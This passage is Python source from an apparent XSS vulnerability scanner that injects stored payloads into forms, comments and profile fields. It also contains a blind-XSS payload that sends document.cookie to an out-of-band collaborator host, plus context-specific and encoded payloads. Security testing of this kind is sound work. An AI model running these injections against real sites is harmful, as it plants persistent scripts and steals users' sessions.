        return vulnerabilities

    def analyze_static_javascript(self, html_content: str) -> List[Vulnerability]:
        """Analyze static JavaScript for DOM XSS patterns"""
        vulnerabilities = []

        # Extract JavaScript from page
        if BS4_AVAILABLE:
            soup = BeautifulSoup(html_content, 'html.parser')
            scripts = soup.find_all('script')

            for i, script in enumerate(scripts):
                if script.string:
                    js_content = script.string
                    line_number = 1

                    # Check for source-to-sink patterns
                    for source in self.sources:
                        for sink in self.sinks:
                            # Pattern: source → sink
                            pattern = rf'{source}.*?{sink}'
                            if re.search(pattern, js_content, re.IGNORECASE | re.DOTALL):
                                frameworks = FrameworkSinkDetector().detect(html_content)

                                severity = "informational"
                                confidence = 0.3

                                # Only raise severity if NO framework is involved
                                if not (frameworks["react"] or frameworks["vue"] or frameworks["angular"]):
                                    severity = "medium"
                                    confidence = 0.6
                                vuln = Vulnerability(
                                    id=hashlib.md5(f"staticjs:{i}:{line_number}".encode()).hexdigest()[:16],
                                    type="dom",
                                    url="javascript",
                                    method="GET",
                                    parameter=f"source:{source}",
                                    payload=f"sink:{sink}",
                                    evidence=f"Static JS analysis: {source} → {sink}",
                                    confidence=confidence,
                                    severity=severity,
                                    cwe=["CWE-79"],
                                    context={
                                        "script_index": i,
                                        "line": line_number,
                                        "pattern": f"{source} → {sink}",
                                        "framework_sinks": frameworks,
                                        "static_only": True,
                                        "requires_runtime_execution": True
                                    }
                                )

                                vulnerabilities.append(vuln)

        return vulnerabilities

    def check_payload_execution(self, payload: str, driver) -> bool:
        """
        Verify real JavaScript execution in the browser.
        This MUST detect execution side-effects, not string presence.
        """
        try:
            # 1️⃣ Install execution monitors EARLY
            driver.execute_script("""
                if (!window.__xssMonitorInstalled) {
                    window.__xssExecuted = false;

                    // Hook alert
                    const originalAlert = window.alert;
                    window.alert = function() {
                        window.__xssExecuted = true;
                        return originalAlert.apply(this, arguments);
                    };

                    // Hook confirm
                    const originalConfirm = window.confirm;
                    window.confirm = function() {
                        window.__xssExecuted = true;
                        return originalConfirm.apply(this, arguments);
                    };

                    // Hook prompt
                    const originalPrompt = window.prompt;
                    window.prompt = function() {
                        window.__xssExecuted = true;
                        return originalPrompt.apply(this, arguments);
                    };

                    // Hook eval
                    const originalEval = window.eval;
                    window.eval = function() {
                        window.__xssExecuted = true;
                        return originalEval.apply(this, arguments);
                    };

                    window.__xssMonitorInstalled = true;
                }
            """)

            # 2️⃣ Allow time for async execution (DOM events, timers)
            time.sleep(0.5)

            # 3️⃣ Check execution flag
            executed = driver.execute_script(
                "return window.__xssExecuted === true;"
            )

            return bool(executed)

        except Exception as e:
            logging.debug(f"Execution verification failed: {e}")
            return False

    def check_for_alerts(self, driver) -> bool:
        """Check if any alerts were triggered"""
        try:
            check_script = """
            return window.xssAlertTriggered || false;
            """
            return driver.execute_script(check_script)
        except:
            return False





class StoredXSSDetector:
    """Detect stored XSS vulnerabilities"""

    def __init__(self, config: ScannerConfig = None):
        self.config = config or ScannerConfig()
        self.payload_generator = XSSPayloadGenerator()

    def test(self, url: str, http_client: AdvancedHTTPClient,
             payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test for stored XSS"""
        vulnerabilities = []

        try:
            # First, crawl to find input forms
            crawler = WebCrawler(http_client, self.config)
            pages = crawler.crawl(url)

            for page in pages:
                for form in page.forms:
                    form_vulns = self.test_form(page.url, form, http_client, payload_generator)
                    vulnerabilities.extend(form_vulns)

                # Also test comment systems, search, etc.
                comment_vulns = self.test_comment_system(page.url, http_client, payload_generator)
                vulnerabilities.extend(comment_vulns)

                profile_vulns = self.test_profile_fields(page.url, http_client, payload_generator)
                vulnerabilities.extend(profile_vulns)

        except Exception as e:
            logging.error(f"Stored XSS test failed for {url}: {e}")

        return vulnerabilities

    def _extract_stored_security_context(self, response: requests.Response) -> Dict[str, Any]:
        headers = {str(k): str(v) for k, v in response.headers.items()}

        csp = CSPAnalyzer(headers)
        trusted_types = TrustedTypesDetector().detect(headers)
        frameworks = FrameworkSinkDetector().detect(response.text)

        return {
            "csp": csp,
            "trusted_types": trusted_types,
            "frameworks": frameworks
        }

    def _verify_stored_execution(self, url: str, payload: str) -> bool:
        if not SELENIUM_AVAILABLE:
            return False

        driver = None
        try:
            driver = webdriver.Chrome()
            driver.get(url)
            time.sleep(2)

            # monitor alert
            driver.execute_script("""
                window.__xssExecuted = false;
                window.alert = function(){ window.__xssExecuted = true; };
            """)

            time.sleep(2)

            return driver.execute_script("return window.__xssExecuted === true")
        except:
            return False
        finally:
            if driver:
                driver.quit()

    def test_form(self, url: str, form: Dict, http_client: AdvancedHTTPClient,
                  payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test form for stored XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_stored_payloads()

        for payload in payloads[:self.config.payload_count]:
            try:
                # Prepare form data
                form_data = {}
                for input_field in form['inputs']:
                    if input_field['name'] and input_field['type'] not in ['submit', 'button', 'reset']:
                        form_data[input_field['name']] = payload

                # Skip if no valid fields
                if not form_data:
                    continue

                # Submit form
                action_url = urljoin(url, form['action']) if form['action'] else url
                if form['method'] == 'POST':
                    response = http_client.post(action_url, data=form_data)
                else:
                    response = http_client.get(action_url, params=form_data)

                # Check if payload was stored
                if self.is_payload_stored(payload, url, http_client):
                    if not self.can_retrieve_payload(payload, url, http_client):
                        continue

                    # Fetch page to analyze security
                    page_response = http_client.get(url)
                    security = self._extract_stored_security_context(page_response)

                    # CSP / Trusted Types gate
                    if security["csp"].has_csp() and security["csp"].blocks_inline():
                        severity = "informational"
                        confidence = 0.3
                        exploitable = False
                    elif security["trusted_types"]:
                        severity = "informational"
                        confidence = 0.3
                        exploitable = False
                    else:
                        # Browser execution required
                        exploitable = self._verify_stored_execution(url, payload)
                        severity = "high" if exploitable else "informational"
                        confidence = 0.9 if exploitable else 0.3

                    vuln = Vulnerability(
                        id=hashlib.md5(f"stored:{url}:{form['action']}".encode()).hexdigest()[:16],
                        type="stored",
                        url=url,
                        method=form['method'],
                        parameter="form_submission",
                        payload=payload,
                        evidence="Stored payload retrieved on subsequent request",
                        confidence=confidence,
                        severity=severity,
                        cwe=["CWE-79"],
                        context={
                            "form_action": form['action'],
                            "form_fields": list(form_data.keys()),
                            "browser_execution": exploitable,
                            "csp": security["csp"].summary(),
                            "trusted_types": security["trusted_types"],
                            "framework_sinks": security["frameworks"]
                        }
                    )

                    vulnerabilities.append(vuln)


            except Exception as e:
                logging.debug(f"Form test failed: {e}")

        return vulnerabilities

    def test_comment_system(self, url: str, http_client: AdvancedHTTPClient,
                            payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test comment systems for stored XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_stored_payloads()

        # Common comment endpoints
        comment_endpoints = [
            f"{url}/comment",
            f"{url}/comments",
            f"{url}/post/comment",
            f"{url}/add/comment",
            f"{url}/submit/comment"
        ]

        for endpoint in comment_endpoints:
            for payload in payloads[:min(10, self.config.payload_count)]:
                try:
                    comment_data = {
                        'comment': payload,
                        'message': payload,
                        'content': payload,
                        'text': payload,
                        'body': payload
                    }

                    # Try POST
                    response = http_client.post(endpoint, data=comment_data)

                    if response.status_code in [200, 201, 302]:
                        # Check if comment appears on page
                        if not self.is_payload_stored(payload, url, http_client):
                            continue

                            # 🔐 STEP 1: fetch page & analyze security
                        page_response = http_client.get(url)
                        security = self._extract_stored_security_context(page_response)

                        # 🔥 STEP 2: exploitability gate
                        exploitable = (
                                not security["csp"].blocks_inline()
                                and not security["trusted_types"]
                                and self._verify_stored_execution(url, payload)
                        )

                        # 🎯 STEP 3: severity & confidence
                        severity = "high" if exploitable else "informational"
                        confidence = 0.9 if exploitable else 0.3

                        vuln = Vulnerability(
                            id=hashlib.md5(f"comment:{endpoint}".encode()).hexdigest()[:16],
                            type="stored",
                            url=endpoint,
                            method="POST",
                            parameter="comment",
                            payload=payload,
                            evidence="Comment payload stored and retrievable",
                            confidence=confidence,
                            severity=severity,
                            cwe=["CWE-79"],
                            context={
                                "browser_execution": exploitable,
                                "csp": security["csp"].summary(),
                                "trusted_types": security["trusted_types"],
                                "framework_sinks": security["frameworks"]
                            }
                        )

                        vulnerabilities.append(vuln)

                except Exception as e:
                    logging.debug(f"Comment test failed for {endpoint}: {e}")

        return vulnerabilities

    def test_profile_fields(self, url: str, http_client: AdvancedHTTPClient,
                            payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test user profile fields for stored XSS"""
        vulnerabilities = []
        payloads = payload_generator.get_stored_payloads()

        # Common profile endpoints
        profile_endpoints = [
            f"{url}/profile",
            f"{url}/account",
            f"{url}/user",
            f"{url}/settings",
            f"{url}/edit/profile"
        ]

        for endpoint in profile_endpoints:
            for payload in payloads[:min(5, self.config.payload_count)]:
                try:
                    profile_data = {
                        'name': payload,
                        'username': payload,
                        'bio': payload,
                        'description': payload,
                        'signature': payload,
                        'title': payload
                    }

                    response = http_client.post(endpoint, data=profile_data)

                    if response.status_code in [200, 201, 302]:
                        # Visit profile page to check
                        profile_page = f"{url}/user/{payload}" if '/user/' in url else f"{url}/profile"
                        profile_response = http_client.get(profile_page)

                        if payload in profile_response.text:
                            # 🔐 STEP 1: analyze security context
                            security = self._extract_stored_security_context(profile_response)

                            # 🔥 STEP 2: exploitability check
                            exploitable = (
                                    not security["csp"].blocks_inline()
                                    and not security["trusted_types"]
                                    and self._verify_stored_execution(profile_page, payload)
                            )

                            # 🎯 STEP 3: severity & confidence
                            severity = "high" if exploitable else "informational"
                            confidence = 0.9 if exploitable else 0.3

                            vuln = Vulnerability(
                                id=hashlib.md5(f"profile:{endpoint}".encode()).hexdigest()[:16],
                                type="stored",
                                url=endpoint,
                                method="POST",
                                parameter="profile_field",
                                payload=payload,
                                evidence="Profile field stores payload",
                                confidence=confidence,
                                severity=severity,
                                cwe=["CWE-79"],
                                context={
                                    "browser_execution": exploitable,
                                    "csp": security["csp"].summary(),
                                    "trusted_types": security["trusted_types"],
                                    "framework_sinks": security["frameworks"]
                                }
                            )

                            vulnerabilities.append(vuln)

                except Exception as e:
                    logging.debug(f"Profile test failed for {endpoint}: {e}")

        return vulnerabilities

    def is_payload_stored(self, payload: str, url: str,
                          http_client: AdvancedHTTPClient) -> bool:
        """Check if payload is stored and retrievable"""
        try:
            # Make new request to see if payload appears
            response = http_client.get(url)

            # Check for exact match
            if payload in response.text:
                return True

            # Check for encoded versions
            encoded_versions = [
                html.escape(payload),
                payload.replace('<', '&lt;').replace('>', '&gt;'),
                quote(payload)
            ]

            for encoded in encoded_versions:
                if encoded in response.text:
                    return True

            return False
        except:
            return False

    def can_retrieve_payload(self, payload: str, url: str,
                             http_client: AdvancedHTTPClient) -> bool:
        """Check if stored payload can be retrieved by other users"""
        try:
            # Try to access from different "session"
            # Create new session without cookies
            temp_client = AdvancedHTTPClient(self.config)

            # Get the page
            response = temp_client.get(url)

            # Check for payload
            return payload in response.text

        except Exception as e:
            logging.debug(f"Payload retrieval check failed: {e}")
            return False





class BlindXSSDetector:
    """Detect blind XSS vulnerabilities (single-payload model)"""

    def __init__(self, config: ScannerConfig = None):
        self.config = config or ScannerConfig()
        self.payload_generator = XSSPayloadGenerator()
        self.collaborator_url = "127.0.0.1:8008"  # replace with real OOB server

    def test(self, url: str, http_client: AdvancedHTTPClient,
             payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
        """Test for blind XSS using a single correlated payload"""

        vulnerabilities = []

        # --------------------------------------------------
        # Generate ONE payload + ONE unique ID
        # --------------------------------------------------
        payload, uid = self.generate_collaborator_payload(self.collaborator_url)

        try:
            contexts_tested = self.test_blind_contexts(url, payload, http_client)

            if contexts_tested:
                vuln = Vulnerability(
                    id=hashlib.md5(f"blind:{url}:{uid}".encode()).hexdigest()[:16],
                    type="blind",
                    url=url,
                    method="MULTIPLE",
                    parameter="multiple",
                    payload=payload,
                    evidence="Blind XSS payload submitted (awaiting OOB callback)",
                    confidence=0.2,
                    severity="informational",
                    cwe=["CWE-79"],
                    context={
                        "contexts_tested": contexts_tested,
                        "collaborator_id": uid,
                        "collaborator_url": self.collaborator_url,
                        "callback_observed": False,
                        "requires_oob_confirmation": True,
                        "triage_note": (
                            "Blind XSS requires out-of-band interaction. "
                            "No callback observed during scan window."
                        )
                    }
                )
                vulnerabilities.append(vuln)

        except Exception as e:
            logging.debug(f"Blind XSS test failed: {e}")

        return vulnerabilities

    # --------------------------------------------------
    # Payload generation (SINGLE PAYLOAD)
    # --------------------------------------------------
    def generate_collaborator_payload(self, collaborator_url: str):
        """
        Generate one blind-XSS payload with a unique correlation ID
        """
        unique_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

        payload = (
            f"<img src=x onerror=\"new Image().src='http://{collaborator_url}/{unique_id}"
            f"?c='+document.cookie\">"
        )

        return payload, unique_id

    # --------------------------------------------------
    # Blind injection points
    # --------------------------------------------------
    def test_blind_contexts(self, url: str, payload: str,
                            http_client: AdvancedHTTPClient) -> List[str]:
        """Inject payload into all realistic blind XSS sinks"""

        contexts_tested = []

        try:
            response = http_client.get(url, headers={"User-Agent": payload})
            if response.status_code < 500:
                contexts_tested.append("User-Agent")
        except:
            pass

        try:
            response = http_client.get(url, headers={"Referer": payload})
            if response.status_code < 500:
                contexts_tested.append("Referer")
        except:
            pass

        try:
            http_client.session.cookies.set("XSS_Test", payload)
            response = http_client.get(url)
            if response.status_code < 500:
                contexts_tested.append("Cookie")
        except:
            pass

        try:
            response = http_client.get(url, headers={"X-Forwarded-For": payload})
            if response.status_code < 500:
                contexts_tested.append("X-Forwarded-For")
        except:
            pass

        try:
            response = http_client.get(f"{url}?test={payload}")
            if response.status_code < 500:
                contexts_tested.append("Query-Parameter")
        except:
            pass

        try:
            response = http_client.post(url, data={"input": payload})
            if response.status_code < 500:
                contexts_tested.append("Form-Data")
        except:
            pass

        try:
            response = http_client.post(url, json={"data": payload})
            if response.status_code < 500:
                contexts_tested.append("JSON-Body")
        except:
            pass

        return contexts_tested

    # --------------------------------------------------
    # OOB verification hook (used later, not during scan)
    # --------------------------------------------------
    def verify_blind_callback(self, collaborator_client, unique_id: str) -> bool:
        """
        Check collaborator logs for interaction
        """
        try:
            interactions = collaborator_client.poll()
            for event in interactions:
                if unique_id in event.get("request", ""):
                    return True
        except Exception:
            pass
        return False



# ============================================================================
# PAYLOAD GENERATOR
# ============================================================================

class XSSPayloadGenerator:
    """Advanced XSS payload generator"""

    def __init__(self):
        self.payloads = XSSPayloads()
        self.context_aware = True
        self.evasion_level = 2  # 0: basic, 1: moderate, 2: advanced

    def get_reflected_payloads(self) -> List[str]:
        """Get payloads for reflected XSS testing"""
        payloads = []

        # Add basic payloads
        payloads.extend(self.payloads.BASIC)

        # Add evasion payloads based on level
        if self.evasion_level >= 1:
            payloads.extend(self.payloads.EVASION[:10])

        if self.evasion_level >= 2:
            payloads.extend(self.payloads.WAF_BYPASS[:10])
            payloads.extend(self.payloads.POLYGLOT[:5])

        return payloads

    def get_dom_payloads(self) -> List[str]:
        """Get payloads for DOM XSS testing"""
        payloads = []
        payloads.extend(self.payloads.DOM)
        payloads.extend(self.payloads.POLYGLOT[:3])
        return payloads

    def get_stored_payloads(self) -> List[str]:
        """Get payloads for stored XSS testing"""
        payloads = []
        payloads.extend(self.payloads.BASIC)
        payloads.extend(self.payloads.BLIND[:5])
        return payloads

    def get_blind_payloads(self) -> List[str]:
        """Get payloads for blind XSS testing"""
        return self.payloads.BLIND

    def generate_context_aware_payload(self, context: str) -> List[str]:
        """Generate payloads based on context (HTML attribute, script, etc.)"""
        if context == 'html':
            return [
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
            ]
        elif context == 'attribute':
            return [
                '" onmouseover=alert(1) x="',
                "' onfocus=alert(1) autofocus '",
                '` onload=alert(1) `'
            ]
        elif context == 'script':
            return [
                '</script><script>alert(1)</script>',
                '\\";alert(1);//',
                "';alert(1);//"
            ]
        elif context == 'url':
            return [
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'javascript:eval(atob("YWxlcnQoMSk="))'
            ]
        else:
            return self.get_reflected_payloads()


# ============================================================================
# TECHNOLOGY FINGERPRINTER
# ============================================================================

class TechnologyFingerprinter:
    """Fingerprint web technologies"""

    def __init__(self):
        self.tech_signatures = {
            'JavaScript Frameworks': {
                'React': [r'react\.js', r'ReactDOM', r'__reactInternalInstance'],
                'Angular': [r'ng-', r'angular\.js', r'data-ng-'],
                'Vue': [r'vue\.js', r'__vue__', r'v-'],
                'jQuery': [r'jquery\.js', r'\$\.', r'jQuery\.'],
                'Backbone': [r'Backbone\.js'],
                'Ember': [r'ember\.js'],
            },
            'Server Technologies': {
                'PHP': [r'X-Powered-By: PHP', r'\.php\?'],
                'ASP.NET': [r'X-Powered-By: ASP\.NET', r'\.aspx\?'],
                'Node.js': [r'X-Powered-By: Express', r'connect\.sid'],
                'Python': [r'X-Powered-By: Python', r'WSGI'],
                'Java': [r'X-Powered-By: JSP', r'JSESSIONID'],
                'Ruby': [r'X-Powered-By: Ruby', r'rails', r'_session_id'],
            },
            'Security Headers': {
                'Content-Security-Policy': [r'Content-Security-Policy'],
                'Strict-Transport-Security': [r'Strict-Transport-Security'],
                'X-Frame-Options': [r'X-Frame-Options'],
                'X-XSS-Protection': [r'X-XSS-Protection'],
                'X-Content-Type-Options': [r'X-Content-Type-Options'],
            }
        }

    def fingerprint(self, url: str, http_client: AdvancedHTTPClient) -> Dict[str, List[str]]:
        """Fingerprint technologies on target"""
        tech_found = defaultdict(list)

        try:
            response = http_client.get(url)

            # Check headers
            for header, value in response.headers.items():
                for tech_type, signatures in self.tech_signatures.items():
                    for tech, patterns in signatures.items():
                        for pattern in patterns:
                            if re.search(pattern, f"{header}: {value}", re.IGNORECASE):
                                tech_found[tech_type].append(tech)

            # Check HTML content
            html_content = response.text[:5000]  # First 5KB
            for tech_type, signatures in self.tech_signatures.items():
                for tech, patterns in signatures.items():
                    for pattern in patterns:
                        if re.search(pattern, html_content, re.IGNORECASE):
                            if tech not in tech_found[tech_type]:
                                tech_found[tech_type].append(tech)

            # Check URL patterns
            parsed = urlparse(url)
            if '.php' in parsed.path:
                tech_found['Server Technologies'].append('PHP')
            elif '.aspx' in parsed.path:
                tech_found['Server Technologies'].append('ASP.NET')
            elif '.jsp' in parsed.path:
                tech_found['Server Technologies'].append('Java')

        except Exception as e:
            logging.debug(f"Fingerprinting failed: {e}")

        return dict(tech_found)


# ============================================================================
# WAF DETECTOR
# ============================================================================

class WAFDetector:
    """Detect Web Application Firewalls - FIXED VERSION"""

    def __init__(self):
        self.waf_signatures = {
            'Cloudflare': [
                (r'cf-ray', r'CF-', r'__cfduid', r'cloudflare-err', r'cf-browser-verification'),
                0.9
            ],
            'Akamai': [
                (r'akamai', r'X-Akamai', r'X-Akamai-Transformed'),
                0.8
            ],
            'Imperva': [
                (r'incap_ses', r'visid_incap', r'X-CDN', r'Imperva'),
                0.85
            ],
            'AWS WAF': [
                (r'AWS', r'X-Amz-Cf-Id', r'X-Amz-Cf-Pop'),
                0.8
            ],
            'ModSecurity': [
                (r'Mod_Security', r'libmodsecurity', r'mod_security'),
                0.7
            ],
            'FortiWeb': [
                (r'FORTIWAFSID', r'FortiWeb'),
                0.7
            ],
            'Barracuda': [
                (r'barracuda', r'Barracuda'),
                0.7
            ],
        }

        # Common security headers that are NOT WAF
        self.security_headers = [
            'Content-Security-Policy',
            'Strict-Transport-Security',
            'X-Frame-Options',
            'X-XSS-Protection',
            'X-Content-Type-Options',
            'Referrer-Policy',
            'Permissions-Policy',
            'Expect-CT'
        ]

        # WAF block patterns in response body
        self.block_patterns = [
            (r'blocked.*(by|security|firewall)', 0.9),
            (r'access.*denied', 0.8),
            (r'security.alert', 0.8),
            (r'forbidden.*403', 0.8),
            (r'not.acceptable', 0.7),
            (r'malicious.*activity', 0.8),
            (r'detected.*attack', 0.8),
        ]

    def detect(self, url: str, http_client: AdvancedHTTPClient) -> Dict[str, Any]:
        """Detect WAF presence - FIXED to avoid false positives"""
        result = {
            'detected': False,
            'type': None,
            'confidence': 0.0,
            'evidence': []
        }

        try:
            # First, make a normal request
            normal_response = http_client.get(url)

            # Check for SECURITY HEADERS (not WAF)
            security_headers_found = []
            for header in self.security_headers:
                if header in normal_response.headers:
                    security_headers_found.append(header)

            # Make test request with suspicious payload
            test_payload = "<script>alert(1)</script>"
            test_url = f"{url}?xss_test={quote(test_payload)}"

            test_response = http_client.get(test_url)

            # -------------------------------------------------
            # METHOD 1: Check for WAF-specific headers
            # -------------------------------------------------
            for waf_type, (patterns, base_confidence) in self.waf_signatures.items():
                for pattern in patterns:
                    # Check response headers
                    for header_name, header_value in test_response.headers.items():
                        combined = f"{header_name}: {header_value}"
                        if re.search(pattern, combined, re.IGNORECASE):
                            # This is likely a real WAF
                            result['detected'] = True
                            result['type'] = waf_type
                            result['confidence'] = base_confidence
                            result['evidence'].append(f"WAF header found: {header_name}")
                            return result

            # -------------------------------------------------
            # METHOD 2: Check for block pages
            # -------------------------------------------------
            response_text = test_response.text.lower()
            response_status = test_response.status_code

            # If we get blocked (403, 406, 429, etc.)
            if response_status in [403, 406, 429, 503]:
                result['detected'] = True
                result['type'] = 'Generic'
                result['confidence'] = 0.7
                result['evidence'].append(f"Blocked status code: {response_status}")

            # Check for block messages in response
            for pattern, confidence in self.block_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    result['detected'] = True
                    result['type'] = 'Generic'
                    result['confidence'] = max(result['confidence'], confidence)
                    result['evidence'].append(f"Block message found: {pattern}")
                    break

            # -------------------------------------------------
            # METHOD 3: Compare normal vs test responses
            # -------------------------------------------------
            normal_length = len(normal_response.text)
            test_length = len(test_response.text)

            # If test response is significantly different (block page)
            if test_length < 1000 and abs(normal_length - test_length) > 500:
                # Might be a block page
                if not result['detected']:
                    result['detected'] = True
                    result['type'] = 'Generic'
                    result['confidence'] = 0.6
                    result['evidence'].append(f"Response length difference: {normal_length} vs {test_length}")

            # -------------------------------------------------
            # FINAL VALIDATION: Security headers are NOT WAF
            # -------------------------------------------------
            if security_headers_found and not result['detected']:
                # Has security headers but no WAF detected
                result['detected'] = False
                result['type'] = f"Security Headers ({', '.join(security_headers_found)})"
                result['confidence'] = 0.1
                result['evidence'] = security_headers_found

            # Very low confidence result - probably not WAF
            if result['confidence'] < 0.5:
                result['detected'] = False
                result['type'] = 'No WAF detected'
                result['confidence'] = 0.1

        except Exception as e:
            logging.debug(f"WAF detection failed: {e}")

        return result


# ============================================================================
# MAIN SCANNER CLASS
# ============================================================================

class AdvancedXSSScanner:
    """Main scanner class orchestrating all components"""

    def __init__(self, config: ScannerConfig = None):
        self.config = config or ScannerConfig()
        self.http_client = AdvancedHTTPClient(self.config)
        self.crawler = WebCrawler(self.http_client, self.config)
        self.detection_engine = XSSDetectionEngine(self.config)
        self.results = ScanResult(
            scan_id=self.generate_scan_id(),
            target_url="",
            start_time=datetime.now().isoformat()
        )

        # Setup logging
        self.setup_logging()

    def generate_scan_id(self) -> str:
        """Generate unique scan ID"""
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_str = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
        return f"xssscan_{timestamp}_{random_str}"

    def setup_logging(self):
        """Setup logging configuration - IMPROVED"""
        log_level = logging.DEBUG if self.config.debug else logging.INFO

        # Create logs directory
        log_dir = "scan_logs"
        os.makedirs(log_dir, exist_ok=True)

        log_file = os.path.join(log_dir, f"{self.results.scan_id}.log")

        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file, encoding='utf-8'),
                logging.StreamHandler()
            ]
        )

        # Reduce verbosity of some noisy libraries
        logging.getLogger("urllib3").setLevel(logging.WARNING)
        logging.getLogger("selenium").setLevel(logging.WARNING)
        logging.getLogger("requests").setLevel(logging.WARNING)

    def scan(self, target_url: str) -> ScanResult:
        """Main scan method"""
        logging.info(f"Starting XSS scan for: {target_url}")

        self.results.target_url = target_url

        try:
            # Phase 1: Crawling and discovery
            logging.info("Phase 1: Crawling target...")
            pages = self.crawler.crawl(target_url)
            self.results.pages = pages
            self.results.pages_scanned = len(pages)

            if not pages:
                logging.warning("No pages found to scan")
                return self.results

            # Phase 2: Vulnerability detection
            logging.info("Phase 2: Testing for XSS vulnerabilities...")
            vulnerabilities = []

            semaphore = threading.Semaphore(self.config.max_concurrent)

            def scan_page(page):
                """Scan a single page with semaphore"""
                with semaphore:
                    try:
                        page_vulns = self.detection_engine.analyze_url(
                            page.url, page, self.http_client
                        )
                        return page_vulns
                    except Exception as e:
                        logging.error(f"Error scanning {page.url}: {e}")
                        return []

            # Process pages with progress tracking
            total_pages = min(len(pages), self.config.max_pages)
            processed_pages = 0

            with ThreadPoolExecutor(max_workers=self.config.max_concurrent) as executor:
                # Submit all tasks
                future_to_page = {
                    executor.submit(scan_page, page): page
                    for page in pages[:self.config.max_pages]
                }

                # Process results as they complete
                for future in as_completed(future_to_page):
                    processed_pages += 1
                    page = future_to_page[future]

                    try:
                        page_vulns = future.result(timeout=60)
                        vulnerabilities.extend(page_vulns)

                        if page_vulns:
                            logging.info(f"Page {processed_pages}/{total_pages}: Found {len(page_vulns)} on {page.url}")
                        else:
                            logging.debug(f"Page {processed_pages}/{total_pages}: No vulnerabilities on {page.url}")

                        # Progress update every 10 pages
                        if processed_pages % 10 == 0:
                            logging.info(f"Progress: {processed_pages}/{total_pages} pages scanned")

                    except TimeoutError:
                        logging.warning(f"Scan for {page.url} timed out")
                    except Exception as e:
                        logging.error(f"Failed to get result for {page.url}: {e}")

            '''with ThreadPoolExecutor(max_workers=self.config.max_concurrent) as executor:
                future_to_url = {
                    executor.submit(self.detection_engine.analyze_url, page.url,page, self.http_client): page.url
                    for page in pages[:self.config.max_pages]
                }

                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        page_vulns = future.result()
                        vulnerabilities.extend(page_vulns)
                        logging.info(f"Found {len(page_vulns)} (Possibility) vulnerabilities on {url}")
                    except Exception as e:
                        logging.error(f"Error scanning {url}: {e}")'''

            #self.results.vulnerabilities = self.deduplicate_vulnerabilities(vulnerabilities)
            #self.results.vulnerabilities = self.smart_deduplicate(vulnerabilities)
            self.results.possible_vulnerabilities = vulnerabilities
            self.results.possible_vulnerabilities_found = len(vulnerabilities)

            self.results.vulnerabilities = self.deduplicate_vulnerabilities_advanced(vulnerabilities)
            self.results.vulnerabilities_found = len(self.results.vulnerabilities)

            #old
            #self.results.vulnerabilities = vulnerabilities
            #self.results.vulnerabilities_found = len(vulnerabilities)

            # Phase 3: Technology fingerprinting
            logging.info("Phase 3: Fingerprinting technologies...")
            fingerprinter = TechnologyFingerprinter()
            waf_detector = WAFDetector()

            tech_info = fingerprinter.fingerprint(target_url, self.http_client)
            waf_info = waf_detector.detect(target_url, self.http_client)

            self.results.tech_stack = tech_info.get('Server Technologies', []) + \
                                      tech_info.get('JavaScript Frameworks', [])
            self.results.waf_detected = waf_info['detected']
            self.results.waf_type = waf_info['type']

            # Calculate statistics
            self.calculate_statistics()

            # End scan
            self.results.end_time = datetime.now().isoformat()
            self.results.duration = (
                    datetime.fromisoformat(self.results.end_time) -
                    datetime.fromisoformat(self.results.start_time)
            ).total_seconds()

            logging.info(f"Scan completed. Found {len(vulnerabilities)} vulnerabilities.")

        except Exception as e:
            logging.error(f"Scan failed: {e}")
            raise

        return self.results

    def deduplicate_vulnerabilities(self, vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
        """Remove duplicate vulnerabilities"""
        unique_vulns = {}

        for vuln in vulnerabilities:
            # Create a unique key: url + parameter + payload hash
            key = f"{vuln.url}:{vuln.parameter}:{hashlib.md5(vuln.payload.encode()).hexdigest()[:8]}"

            if key not in unique_vulns:
                unique_vulns[key] = vuln
            else:
                # Keep the one with higher confidence
                if vuln.confidence > unique_vulns[key].confidence:
                    unique_vulns[key] = vuln

        return list(unique_vulns.values())

    def deduplicate_vulnerabilities_advanced(self, vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
        """Advanced deduplication considering context and severity"""
        # Group by URL + parameter
        grouped = {}

        for vuln in vulnerabilities:
            # Create grouping key
            key = f"{vuln.url}:{vuln.parameter}"

            if key not in grouped:
                grouped[key] = []
            grouped[key].append(vuln)

        unique_vulns = []

        for key, vuln_list in grouped.items():
            # Sort by confidence (highest first)
            vuln_list.sort(key=lambda x: x.confidence, reverse=True)

            # Take the highest confidence one
            best_vuln = vuln_list[0]

            # Add context about variations found
            if len(vuln_list) > 1:
                payload_variations = list(set([v.payload[:50] for v in vuln_list]))
                best_vuln.context['variations_found'] = len(vuln_list)
                best_vuln.context['payload_samples'] = payload_variations[:3]  # First 3

            unique_vulns.append(best_vuln)

        return unique_vulns

    def smart_deduplicate(self, vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
        """Smart deduplication with multiple strategies"""
        if not vulnerabilities:
            return []

        # Strategy 1: Remove exact duplicates
        exact_unique = self._remove_exact_duplicates(vulnerabilities)

        # Strategy 2: Remove similar payloads on same parameter
        context_unique = self._remove_context_duplicates(exact_unique)

        # Strategy 3: Keep only highest severity per attack vector
        final_vulns = self._keep_best_per_vector(context_unique)

        return final_vulns

    def _remove_exact_duplicates(self, vulns: List[Vulnerability]) -> List[Vulnerability]:
        """Remove exact duplicates (same URL + exact same payload)"""
        seen = set()
        unique = []

        for vuln in vulns:
            key = f"{vuln.url}:{vuln.parameter}:{vuln.payload}"
            if key not in seen:
                seen.add(key)
                unique.append(vuln)

        return unique

    def _remove_context_duplicates(self, vulns: List[Vulnerability]) -> List[Vulnerability]:
        """Remove duplicates in same context"""
